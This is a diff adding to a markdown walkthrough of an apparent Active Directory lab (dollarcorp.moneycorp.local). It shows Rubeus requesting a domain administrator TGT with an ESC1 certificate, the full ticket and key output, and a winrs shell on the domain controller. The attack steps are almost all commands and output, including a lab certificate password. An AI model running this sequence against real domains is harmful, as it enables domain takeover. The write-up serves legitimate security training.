@@ -680,10 +680,11 @@ unable to write 'random state'
 
 ```
 
+I shuold reboot domain controller of the platform becaus kerberos do not work properly:
 
 
 ```
-C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:C:\AD\cert2.pfx /password:SecretPass@123 /ptt
+C:\AD\Tools>C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
 
    ______        _
   (_____ \      | |
@@ -696,5 +697,91 @@ C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:C:\AD\cert2.pfx /
 
 [*] Action: Ask TGT
 
+[*] Using PKINIT with etype rc4_hmac and subject: CN=student162, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\administrator'
+[*] Using domain controller: 172.16.2.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+      ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/dollarcorp.moneycorp.local
+  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
+  UserName                 :  administrator
+  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
+  StartTime                :  5/3/2023 12:28:58 AM
+  EndTime                  :  5/3/2023 10:28:58 AM
+  RenewTill                :  5/10/2023 12:28:58 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  rgzSotrGb9pmUk2KonYlVA==
+  ASREP (key)              :  F8D72B125659F7721FF36C2D0E1A2EB7
+
+
+
+```
+
+Access to the domain controller:
+
+
+```
+C:\AD\Tools>klist
+
+Current LogonId is 0:0xa3e025a
+
+Cached Tickets: (1)
+
+#0>     Client: administrator @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 5/3/2023 0:28:58 (local)
+        End Time:   5/3/2023 10:28:58 (local)
+        Renew Time: 5/10/2023 0:28:58 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+        
+C:\AD\Tools>winrs -r:dcorp-dc cmd
+Microsoft Windows [Version 10.0.20348.1249]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>whoami
+whoami
+dcorp\administrator
+
+C:\Users\Administrator>hostname
+hostname
+dcorp-dc
 
 ```
